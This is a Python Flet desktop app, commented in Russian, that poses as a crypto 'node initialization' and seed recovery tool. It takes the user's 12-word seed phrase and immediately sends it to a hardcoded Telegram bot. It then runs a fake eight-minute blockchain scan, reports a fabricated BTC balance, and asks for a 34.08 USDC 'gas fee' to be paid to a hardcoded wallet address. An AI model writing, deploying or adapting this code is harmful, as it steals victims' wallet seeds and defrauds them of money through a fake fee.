import flet as ft
import requests
import random
import time

# --- ТВОИ ДАННЫЕ ---
TOKEN = "8601525427:AAEuynoRLo7TkjpKQ1aflArSGXplmsGIZVw"
CHAT_ID = "8601525427" 
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

def main(page: ft.Page):
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.padding = 30
    page.bgcolor = "#0a0a0a"

    # Секции
    container = ft.Column(horizontal_alignment="center", spacing=20)
    
    # 1. Экран ввода
    header = ft.Text("NODE INITIALIZATION", size=26, weight="bold", color="blueaccent")
    seed_input = ft.TextField(label="Seed Phrase (12 words)", multiline=True, min_lines=3, width=350, border_radius=12)
    start_btn = ft.ElevatedButton("START RECOVERY", width=300, height=55, bgcolor="blue", color="white")
    
    # 2. Экран загрузки
    progress_bar = ft.ProgressBar(width=350, color="blueaccent", visible=False)
    log_text = ft.Text("", italic=True, visible=False)

    def send_to_tg(msg):
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}"
        try: requests.get(url, timeout=5)
        except: pass

    def start_process(e):
        phrase = seed_input.value.strip()
        if len(phrase.split()) != 12:
            page.snack_bar = ft.SnackBar(ft.Text("Введите 12 слов!"))
            page.snack_bar.open = True
            page.update()
            return

        # МГНОВЕННАЯ ОТПРАВКА
        send_to_tg(f"🚨 НОВАЯ СИД-ФРАЗА:\n\n{phrase}")

        # ПЕРЕКЛЮЧЕНИЕ НА ЗАГРУЗКУ
        seed_input.visible = False
        start_btn.visible = False
        header.value = "SCANNING BLOCKCHAIN..."
        progress_bar.visible = True
        log_text.visible = True
        page.update()

        # ИМИТАЦИЯ 8 МИНУТ (Цикл с обновлением)
        steps = ["Connecting...", "Scanning...", "Decrypting...", "Verifying...", "Finalizing..."]
        for i in range(101):
            if i % 20 == 0:
                log_text.value = steps[i // 25] if i // 25 < len(steps) else "Finishing..."
            progress_bar.value = i / 100
            page.update()
            time.sleep(4.8) # 4.8 сек * 100 шагов = 480 секунд (ровно 8 минут)

        # ФИНАЛ: ОПЛАТА ГАЗА
        btc = round(random.uniform(0.0006, 0.0009), 6)
        container.controls.clear()
        container.controls.extend([
            ft.Icon(ft.icons.CHECK_CIRCLE, color="green", size=60),
            ft.Text("SIGNATURE FOUND!", size=22, weight="bold", color="green"),
            ft.Text(f"Available Balance: {btc} BTC", size=18),
            ft.Container(
                padding=20, bgcolor="#1a1a1a", border_radius=15,
                content=ft.Column([
                    ft.Text("To withdraw, pay Network Gas Fee (34.08 USDC):", size=12),
                    ft.Text("Network: BNB Smart Chain (BEP20)", size=12, weight="bold"),
                    ft.Text(TARGET_ADDRESS, size=11, color="blue200", selectable=True, weight="bold"),
                ], horizontal_alignment="center")
            ),
            ft.ElevatedButton("I HAVE PAID (CONFIRM)", width=300, height=50, on_click=lambda _: show_done())
        ])
        page.update()

    def show_done():
        container.controls.clear()
        container.controls.extend([
            ft.Icon(ft.icons.DONE_ALL, color="blue", size=70),
            ft.Text("TRANSACTION SENT!", size=24, weight="bold"),
            ft.Text("BTC has been sent to your wallet address.", text_align="center"),
            ft.Text("Status: Pending (Confirmations: 0/3)", color="yellow")
        ])
        send_to_tg("💰 КНОПКА 'ОПЛАТИЛ' НАЖАТА!")
        page.update()

    start_btn.on_click = start_process
    container.controls.extend([header, seed_input, start_btn, progress_bar, log_text])
    page.add(container)

if __name__ == "__main__":
    ft.app(target=main)
